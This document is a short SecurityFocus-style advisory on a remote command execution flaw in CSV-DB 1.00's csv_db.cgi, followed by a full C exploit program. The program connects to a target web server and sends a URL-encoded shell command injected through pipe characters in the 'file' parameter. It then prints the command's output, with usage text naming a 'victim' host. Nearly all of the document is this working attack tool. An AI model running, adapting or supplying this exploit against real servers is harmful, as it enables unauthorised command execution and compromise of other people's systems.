source: http://www.securityfocus.com/bid/14059/info

CSV_DB.CGI/i_DB.CGI are affected by a remote command execution vulnerability.

Specifically, an attacker can supply arbitrary commands prefixed with the '|' character through the 'csv_db.cgi' script that will be executed in the context of the Web server running the application.

CSV-DB 1.00 is affected by this issue. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 80    // port of the web server
#define CMDB 512   // buffer length for commands
#define BUFF 6000    // buffer length for output's commands
#define BANSTART "NoFaceKing"
#define BANSTOP  "NoFaceKing_crouz_com"

void info(void);
void sendxpl(FILE *out, char *argv[], int type);
void readout(int sock, char *argv[]);
void errgeth(void);
void errsock(void);
void errconn(void);
void errsplo(void);
void errbuff(void);


int main(int argc, char *argv[]){

FILE *out;
int sock, sockconn, type;
struct sockaddr_in addr;
struct hostent *hp;


if(argc != 5)
  info();

type = atoi(argv[4]);

if(type < 0 || type > 3)
  info();

if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  errsock();

  system("clear");
  printf("[*] Creating socket  [OK]\n");

if((hp = gethostbyname(argv[1])) == NULL)
  errgeth();

  printf("[*] Resolving victim host [OK]\n");

memset(&addr,0,sizeof(addr));
memcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);

sockconn = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
if(sockconn < 0)
  errconn();

  printf("[*] Connecting at victim host   [OK]\n",argv[1]);

out = fdopen(sock,"a");
setbuf(out,NULL);

sendxpl(out, argv, type);

  printf("[*] Sending exploit  [OK]\n");

readout(sock, argv);

shutdown(sock, 2);
close(sock);
fclose(out);

return(0);

}


void info(void){

system("clear");
printf("#####################################################\n"
      "# csv_db.cgi                                         #\n"
      "# Remote Code Execution                              #\n"
      "# exploit coded by No_Face_King&Calla bug by blahplok#\n"
      "# www.crouz.com  Thanks from ali rashidi             #\n"
      "######################################################\n\n"
      "[Usage]\n\n"
      " csv.exe <victim> <path_awstats> <cmd> <type>\n\n"
      "        [Type]\n"
      "               1) ?file=|cmd|\n"
      "[example]\n\n"
      " csv.exe www.victim.com /cgi-bin/csv_db.cgi \"uname -a\" 1\n\n");
exit(1);

}


void sendxpl(FILE *out, char *argv[], int type){

char cmd[CMDB], cmd2[CMDB*3], cc;
char *hex = "0123456789abcdef";
int i, j = 0, size;

size = strlen(argv[3]);
strncpy(cmd,argv[3],size);

/*** Url Encoding Mode ON ***/

for(i = 0; i < size; i++){
   cc = cmd[i];
   if(cc >= 'a' && cc <= 'z'
   || cc >= 'A' && cc <= 'Z'
   || cc >= '0' && cc <= '9'
   || cc == '-' || cc == '_' || cc == '.')
   cmd2[j++] = cc;
 else{
      cmd2[j++] = '%';
      cmd2[j++] = hex[cc >> 4];
      cmd2[j++] = hex[cc & 0x0f];
     }
}

cmd2[j] = '\0';

/*** Url Encoding Mode OFF;P ***/

if(type==1)
  fprintf(out,"GET %s?file=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n"
              "Connection: Keep-Alive\n"
              "Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n"
              "Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n"
              "Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n"
              "Accept-Language: en\n"
              "Host: %s\n\n",argv[2],BANSTART,cmd2,BANSTOP,argv[1]);
}


void readout(int sock, char *argv[]){

int i=0, flag;
char output[BUFF], tmp;
printf("[*] Output by %s:\n\n",argv[1]);

while(strstr(output,BANSTART) == NULL){
flag = read(sock,&tmp,1);
output[i++] = tmp;
if(i >= BUFF)
  errbuff();
if(flag==0)
  errsplo();
}
while(strstr(output,BANSTOP) == NULL){
read(sock,&tmp,1);
output[i++] = tmp;
putchar(tmp);
if(i >= BUFF)
  errbuff();
}
printf("\n\n");

}


void errsock(void){

system("clear");
printf("[x] Creating socket             [FAILED]\n\n");
exit(1);

}


void errgeth(void){

printf("[x] Resolving victim host       [FAILED]\n\n");
exit(1);

}


void errconn(void){

printf("[x] Connecting at victim host [FAILED]\n\n");
exit(1);

}


void errsplo(void){

printf("[x] Exploiting victim host      [FAILED]\n\n");
exit(1);

}


void errbuff(void){

printf("[x] Your buffer for output's command is FULL !!!\n\n");
exit(1);

}


